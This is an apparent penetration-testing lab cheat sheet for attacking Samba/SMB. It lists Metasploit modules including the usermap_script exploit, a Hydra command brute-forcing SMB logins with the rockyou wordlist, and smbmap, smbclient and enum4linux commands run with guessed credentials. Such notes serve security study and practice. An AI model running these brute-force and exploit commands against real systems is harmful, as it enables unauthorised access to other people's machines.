# Metasploit modules

- auxiliary/scanner/smb/smb_login
- auxiliary/scanner/smb/pipe_auditor
- exploit/multi/samba/usermap_script

# Hydra

- `hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.212.251.3 smb`
- `gzip -d /usr/share/wordlists/rockyou.txt.gz`

# smbmap

- `smbmap -H 192.212.251.3 -u admin -p password1`
- `smbclient -L 192.212.251.3 -U jane` : list shares on samba server
- `smbclient //192.212.251.3/jane -U jane` : check if jane share exists
- `enum4linux -r -u "admin" -p "password1" 192.212.251.3` : get SID

Refer to Info Gathering & Enum > smb for more commands